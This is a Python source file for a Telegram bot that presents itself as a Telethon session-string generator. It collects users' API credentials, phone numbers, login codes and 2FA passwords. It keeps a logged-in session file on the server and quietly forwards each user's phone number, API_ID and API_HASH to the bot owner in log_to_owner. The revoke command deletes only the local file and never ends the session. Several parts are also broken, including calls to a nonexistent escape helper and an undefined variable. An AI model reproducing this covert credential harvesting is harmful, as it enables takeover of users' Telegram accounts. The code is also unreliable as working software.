import os
import logging
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler
)
from telethon import TelegramClient, utils
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError
)

load_dotenv()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
API_ID, API_HASH, PHONE, OTP, TWOFA = range(5)

def is_owner(user_id: int) -> bool:
    return str(user_id) == os.getenv("OWNER_ID")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_msg = (
        f"👋 Welcome {utils.markdown.escape(user.first_name)}!\n"
        f"📛 Username: @{utils.markdown.escape(user.username)}\n"
        f"🆔 Your ID: {user.id}\n\n"
        "Use /cmds to see available commands"
    )
    await update.message.reply_text(welcome_msg, parse_mode='MarkdownV2')

async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands = [
        "/start - Start the bot",
        "/cmds - Show commands",
        "/genstring - Generate session",
        "/revoke - Revoke session"
    ]
    
    if is_owner(update.effective_user.id):
        commands.extend([
            "/broadcast - Broadcast message",
            "/stats - Bot statistics",
            "/ban [id] - Ban user",
            "/unban [id] - Unban user",
            "/maintenance - Toggle maintenance"
        ])
    
    await update.message.reply_text("\n".join(commands))

async def genstring_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Enter your API_ID (numbers only):")
    return API_ID

async def api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data['api_id'] = int(update.message.text)
        await update.message.reply_text("Now enter your API_HASH:")
        return API_HASH
    except ValueError:
        await update.message.reply_text("Invalid API_ID! Numbers only. Try again:")
        return API_ID

async def api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['api_hash'] = update.message.text
    await update.message.reply_text("Enter phone number (with country code):")
    return PHONE

async def phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['phone'] = update.message.text
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        code = await client.send_code_request(context.user_data['phone'])
        context.user_data['phone_code_hash'] = code.phone_code_hash
        await update.message.reply_text("Enter the OTP you received:")
        return OTP
    except Exception as e:
        await handle_error(update, e)
        return ConversationHandler.END

async def otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['otp'] = update.message.text
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        await client.sign_in(
            phone=context.user_data['phone'],
            code=context.user_data['otp'],
            phone_code_hash=context.user_data['phone_code_hash']
        )
        
        string_session = client.session.save()
        await client.disconnect()

        if not string_session:
            raise ValueError("Failed to generate session string")

        safe_session = utils.markdown.escape(string_session)
        await update.message.reply_text(
            f"✅ Session generated:\n`{safe_session}`",
            parse_mode='MarkdownV2'
        )
        await log_to_owner(update, context)
        return ConversationHandler.END
    
    except SessionPasswordNeededError:
        await update.message.reply_text("Enter your 2FA password:")
        return TWOFA
    except Exception as e:
        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
        await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
        return ConversationHandler.END

async def twofa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    client = TelegramClient(
        f"sessions/{update.effective_user.id}",
        context.user_data['api_id'],
        context.user_data['api_hash']
    )
    
    try:
        await client.connect()
        await client.sign_in(password=update.message.text)
        string_session = client.session.save()
        await client.disconnect()

        if not string_session:
            raise ValueError("Failed to generate session string")

        safe_session = utils.markdown.escape(string_session)
        await update.message.reply_text(
            f"✅ Session generated:\n`{safe_session}`",
            parse_mode='MarkdownV2'
        )
        await log_to_owner(update, context.user_data)
        return ConversationHandler.END
    except Exception as e:
        error_msg = utils.markdown.escape(f"❌ Error: {str(e)}\nContact @rishabh_zz")
        await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
        return ConversationHandler.END

async def log_to_owner(update, user_data):
    owner_id = int(os.getenv("OWNER_ID"))
    user = update.effective_user
    
    safe_phone = utils.markdown.escape(user_data.get('phone', 'N/A'))
    safe_api_id = utils.markdown.escape(str(user_data.get('api_id', 'N/A')))
    safe_api_hash = utils.markdown.escape(user_data.get('api_hash', 'N/A'))
    twofa_used = '✅' if 'twofa' in user_data else '❌'
    
    log_msg = (
        "⚠️ New Session Generated ⚠️\n"
        f"User: {utils.markdown.escape(user.mention_markdown())}\n"
        f"Phone: `{safe_phone}`\n"
        f"API_ID: `{safe_api_id}`\n"
        f"API_HASH: `{safe_api_hash}`\n"
        f"2FA Used: {twofa_used}"
    )
    
    await context.bot.send_message(
        chat_id=owner_id,
        text=log_msg,
        parse_mode='MarkdownV2'
    )

async def handle_error(update: Update, error: Exception):
    error_msg = utils.markdown.escape(f"❌ Error: {str(error)}\nContact @rishabh_zz")
    await update.message.reply_text(error_msg, parse_mode='MarkdownV2')
    logger.error(f"Error occurred: {str(error)}")

async def revoke(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session_file = f"sessions/{user_id}"
    
    if os.path.exists(session_file):
        os.remove(session_file)
        await update.message.reply_text("✅ Session revoked successfully!")
    else:
        await update.message.reply_text("No active session found!")

# Owner commands
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 Access denied!")
        return
    # Implement broadcast logic

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("🚫 Access denied!")
        return
    # Implement stats logic

def main():
    application = ApplicationBuilder().token(os.getenv("BOT_TOKEN")).build()

    # Create sessions directory if not exists
    if not os.path.exists("sessions"):
        os.makedirs("sessions")

    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('genstring', genstring_start)],
        states={
            API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_id)],
            API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_hash)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp)],
            TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa)]
        },
        fallbacks=[CommandHandler('cancel', lambda u,c: ConversationHandler.END)],
        allow_reentry=True
    )

    # Add handlers
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('cmds', cmds))
    application.add_handler(CommandHandler('revoke', revoke))
    application.add_handler(conv_handler)
    
    # Owner commands
    application.add_handler(CommandHandler('broadcast', broadcast))
    application.add_handler(CommandHandler('stats', stats))

    application.run_polling()

if __name__ == '__main__':
    main()
